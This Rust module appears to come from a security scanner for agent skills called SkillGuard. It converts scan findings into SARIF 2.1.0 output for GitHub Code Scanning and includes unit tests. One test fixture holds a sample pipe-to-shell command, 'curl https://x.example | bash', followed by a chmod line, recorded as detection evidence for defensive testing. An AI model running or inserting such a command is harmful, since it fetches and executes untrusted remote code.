//! SARIF 2.1.0 output for GitHub Code Scanning.
//!
//! Two things matter for a SARIF consumer: stable `ruleId`s so findings can be
//! tracked across runs, and `partialFingerprints` so a moved line is still
//! recognised as the same finding.

use crate::models::Severity;
use crate::report::Report;
use serde_json::{json, Value};

const SCHEMA: &str =
    "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json";

pub fn to_sarif(report: &Report) -> String {
    let rules: Vec<Value> = crate::scan::rules::catalogue()
        .into_iter()
        .map(|r| {
            json!({
                "id": r.id,
                "name": r.id,
                "shortDescription": { "text": r.message },
                "fullDescription": { "text": r.remediation },
                "defaultConfiguration": { "level": sarif_level(r.severity) },
                "properties": {
                    "tags": ["security", "agent-skill", "supply-chain"],
                    "capability": r.capability,
                    "severity": r.severity.as_str(),
                },
            })
        })
        .collect();

    let mut results: Vec<Value> = Vec::new();
    for (skill, f) in report.all_findings() {
        let mut physical = json!({
            "artifactLocation": { "uri": f.file, "uriBaseId": "%SRCROOT%" },
        });
        if f.primary_line() > 0 {
            physical["region"] = json!({ "startLine": f.primary_line() });
        }

        let mut msg = f.message.clone();
        if let Some(ev) = f.evidence.first() {
            msg.push_str(&format!("\n  {}: {}", ev.line, ev.text));
        }
        if let Some(sec) = f.evidence.first().and_then(|e| e.secondary.as_ref()) {
            msg.push_str(&format!("\n  {}: {}", sec.line, sec.text));
        }

        results.push(json!({
            "ruleId": f.rule.as_str(),
            "level": sarif_level(f.severity),
            "message": { "text": msg },
            "locations": [{
                "physicalLocation": physical,
                "logicalLocations": [{
                    "name": skill,
                    "fullyQualifiedName": format!("{skill}/SKILL.md"),
                    "kind": "module",
                }],
            }],
            "partialFingerprints": { "skillguard/v1": fingerprint(f) },
            "properties": {
                "confidence": f.confidence.as_str(),
                "capability": f.capability.clone().unwrap_or_default(),
                "skill": skill,
            },
        }));
    }

    let doc = json!({
        "$schema": SCHEMA,
        "version": "2.1.0",
        "runs": [{
            "tool": {
                "driver": {
                    "name": report.tool,
                    "version": report.tool_version,
                    "informationUri": "https://github.com/lxbworld/SkillGuard",
                    "rules": rules,
                }
            },
            "results": results,
            "properties": {
                "ruleSetVersion": report.rule_set_version,
                "totals": {
                    "critical": report.totals.critical,
                    "high": report.totals.high,
                    "medium": report.totals.medium,
                    "low": report.totals.low,
                    "info": report.totals.info,
                },
            },
        }],
    });

    serde_json::to_string_pretty(&doc).unwrap_or_else(|_| "{\"runs\":[]}".to_owned())
}

fn sarif_level(sev: Severity) -> &'static str {
    match sev {
        Severity::Critical | Severity::High => "error",
        Severity::Medium => "warning",
        Severity::Low | Severity::Info => "note",
    }
}

/// A stable fingerprint from the content of the finding, so that inserting an
/// unrelated line above it does not create a new alert.
fn fingerprint(f: &crate::models::Finding) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(f.rule.as_str().as_bytes());
    h.update(b"\0");
    h.update(f.file.as_bytes());
    h.update(b"\0");
    if let Some(ev) = f.evidence.first() {
        h.update(ev.text.as_bytes());
    }
    format!("{:x}", h.finalize())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{Confidence, Evidence, Finding, RuleId};
    use crate::report::{Counts, SkillReport};

    fn report() -> Report {
        let f = Finding::new(
            RuleId::from("DL_PIPE_TO_SHELL"),
            Severity::Critical,
            Confidence::High,
            "scripts/a.sh",
            "download to execute",
            vec![Evidence {
                line: 2,
                text: "curl https://x.example | bash".into(),
                secondary: Some(Box::new(Evidence {
                    line: 3,
                    text: "chmod +x /tmp/i".into(),
                    secondary: None,
                    note: Some("execute sink".into()),
                })),
                note: None,
            }],
        );
        Report::new(vec![SkillReport {
            name: "s".into(),
            rule_set_version: "0.1.0".into(),
            description: None,
            declared_permissions_raw: None,
            license_declared: None,
            license_file_found: false,
            capabilities: Default::default(),
            dependencies: vec![],
            counts: Counts::of(std::slice::from_ref(&f)),
            findings: vec![f],
            skipped: vec![],
        }])
    }

    #[test]
    fn is_valid_shaped_sarif() {
        let v: Value = serde_json::from_str(&to_sarif(&report())).expect("valid json");
        assert_eq!(v["version"], "2.1.0");
        assert!(v["$schema"]
            .as_str()
            .unwrap_or("")
            .contains("sarif-schema-2.1.0"));
        let run = &v["runs"][0];
        assert_eq!(run["tool"]["driver"]["name"], "skillguard");
        assert_eq!(run["results"].as_array().unwrap().len(), 1);
    }

    #[test]
    fn every_emittable_rule_is_declared_in_the_driver() {
        let v: Value = serde_json::from_str(&to_sarif(&report())).expect("valid json");
        let declared = v["runs"][0]["tool"]["driver"]["rules"]
            .as_array()
            .unwrap()
            .len();
        assert_eq!(declared, crate::scan::rules::rule_count());
    }

    #[test]
    fn critical_maps_to_error_level() {
        let v: Value = serde_json::from_str(&to_sarif(&report())).expect("valid json");
        assert_eq!(v["runs"][0]["results"][0]["level"], "error");
    }

    #[test]
    fn location_and_fingerprint_present() {
        let v: Value = serde_json::from_str(&to_sarif(&report())).expect("valid json");
        let r = &v["runs"][0]["results"][0];
        assert_eq!(
            r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"],
            "scripts/a.sh"
        );
        assert_eq!(
            r["locations"][0]["physicalLocation"]["region"]["startLine"],
            2
        );
        assert!(r["partialFingerprints"]["skillguard/v1"].as_str().is_some());
    }

    #[test]
    fn fingerprint_is_stable_and_content_sensitive() {
        let r = report();
        let v1: Value = serde_json::from_str(&to_sarif(&r)).unwrap();
        let v2: Value = serde_json::from_str(&to_sarif(&r)).unwrap();
        assert_eq!(
            v1["runs"][0]["results"][0]["partialFingerprints"],
            v2["runs"][0]["results"][0]["partialFingerprints"]
        );

        let mut other = r.clone();
        other.skills[0].findings[0].evidence[0].text = "something else".into();
        let v3: Value = serde_json::from_str(&to_sarif(&other)).unwrap();
        assert_ne!(
            v1["runs"][0]["results"][0]["partialFingerprints"],
            v3["runs"][0]["results"][0]["partialFingerprints"]
        );
    }

    #[test]
    fn secondary_evidence_appears_in_the_message() {
        let v: Value = serde_json::from_str(&to_sarif(&report())).unwrap();
        let msg = v["runs"][0]["results"][0]["message"]["text"]
            .as_str()
            .unwrap();
        assert!(msg.contains("chmod +x /tmp/i"), "{msg}");
    }

    #[test]
    fn clean_skill_still_emits_a_valid_document() {
        let empty = Report::new(vec![]);
        let v: Value = serde_json::from_str(&to_sarif(&empty)).expect("valid json");
        assert_eq!(v["runs"][0]["results"].as_array().unwrap().len(), 0);
    }
}
